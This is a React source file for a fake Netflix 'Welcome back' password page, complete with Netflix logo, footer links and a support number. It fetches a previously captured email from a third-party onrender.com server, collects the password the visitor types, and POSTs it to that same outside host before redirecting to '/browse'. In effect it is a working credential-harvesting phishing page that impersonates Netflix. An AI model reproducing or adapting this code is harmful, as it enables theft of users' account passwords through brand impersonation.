
import React, { useEffect ,useState } from 'react';
import { Globe } from 'lucide-react';
import axios from 'axios';
import {useNavigate} from 'react-router-dom';

function Loginpage1(){ 

    const [user, setUser] = useState('');

  useEffect(() => {
    axios.get('https://server-9iiw.onrender.com/p')
      .then((response) => {
        setUser(response.data);
          console.log(response.data);
      })
      .catch((error) => {
        console.error('Error retrieving data:', error);
      });
  }, []);
  
  const [name , setName ] =useState('');
  const navigate = useNavigate();
 

 function handleChange(event){
  setName(
     event.target.value
  );
}

 
  async function handleClick(event){
    setName(name);
  event.preventDefault();
  if(name !==  "" ){

  try {
    const response =  await axios.post('https://server-9iiw.onrender.com/data', {name });
    console.log(response.data.message);
    navigate("/browse");
  } catch (error) {
    console.error('Error submitting email:', error);
  }
}
  }
  
  

return(
<div className='login'>
<div className='navig'>

    <div className='logoone'> 
 <img src="https://img.icons8.com/color/170/netflix.png" alt="netflx" />

    </div>
    <div className='signin'><a href="/login">Sign In</a>
    </div>
</div>
<div className='firstcont'>
    <div className='insidecont'>
        <div className='deepcont'>
            <div className='deepercont'>
<span>STEP 1 OF 3</span>
<h2>Welcome back!<br></br>Joining Netflix is easy.</h2>
<div className='deepestcont'>
    <span>Enter your password and you'll be watching in no time.</span>
</div>
<div className='deepest2cont'>
    <div className='deepest3cont'>
        <div className='idiv1'>Email</div>
        <div className='idiv2' >
            
            <p>{user}</p>
        </div>
    </div>
    <form onSubmit={handleClick}>
  <div>
    <input type="password" className='deepest4cont' placeholder=' Enter your password' onChange={handleChange}></input>
</div>
<div className="deepest5cont">
<a href="#">Forgot your password?</a>
</div>
<div className='next'>
<button>Next</button>
</div>
</form>
</div>

        </div>
        </div>
        </div>
</div>
<div className='footertwo'>
    <p>Questions? Call <a href="tel:000-800-919-1694">000-800-919-1694</a></p>
    <ul>
        <li>FAQ</li>
        <li>Help Centre</li>
        <li>Netflix Shop</li>
        <li>Terms of Use</li>
        <li>Privacy</li>
        <li>Cookie Preferences</li>
        <li>Corporate Information</li>
    </ul>
    <button> <Globe size={21}/>&nbsp;&nbsp;English</button>
</div>
</div>)}

export default Loginpage1 ;
